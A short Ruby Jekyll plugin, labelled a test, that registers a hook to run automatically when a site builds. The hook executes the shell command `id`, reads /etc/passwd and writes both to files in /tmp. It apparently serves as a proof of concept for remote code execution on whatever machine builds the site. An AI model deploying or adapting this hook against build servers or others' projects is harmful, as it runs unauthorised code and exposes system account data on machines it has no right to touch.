# Jekyll plugin test
Jekyll::Hooks.register :site, :after_init do |site|
  # Test if we can execute code
  result = `id 2>&1`
  File.open("/tmp/jekyll_rce_test.txt", "w") { |f| f.write(result) }
  
  # Also try to read /etc/passwd
  begin
    content = File.read("/etc/passwd")
    File.open("/tmp/etc_passwd_read.txt", "w") { |f| f.write(content) }
  rescue => e
    File.open("/tmp/error.txt", "w") { |f| f.write(e.message) }
  end
end
